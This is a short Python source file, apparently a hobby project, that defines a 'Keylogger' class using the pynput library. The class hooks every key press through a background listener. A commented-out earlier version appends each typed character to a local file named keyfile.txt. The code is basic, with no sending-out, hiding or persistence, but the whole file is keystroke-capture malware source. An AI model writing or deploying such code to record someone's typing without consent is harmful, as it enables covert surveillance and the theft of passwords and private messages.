from pynput import keyboard

# def keyPressed(key):
#     print("hello")
#     print(str(key))
#     with open("./keyfile.txt", 'a') as logKey:
#         try:
#             char = key.char
#             logKey.write(char)
#         except:
#             print("Error getting char")
    

# if __name__ == "__main__":
#     listener = keyboard.Listener(on_press=keyPressed)
#     listener.start()
#     input()

class Keylogger:
    def __init__(self):
        self.key = ""
        self.listener = None
    
    def start(self):
        self.listener = keyboard.Listener(on_press=self.log)
        self.listener.start()

    def log(self, key):
        self.key = key
        self.get()

    def stop(self):
        self.listener.stop()
        self.listener = None

    def get(self):
        return self.key
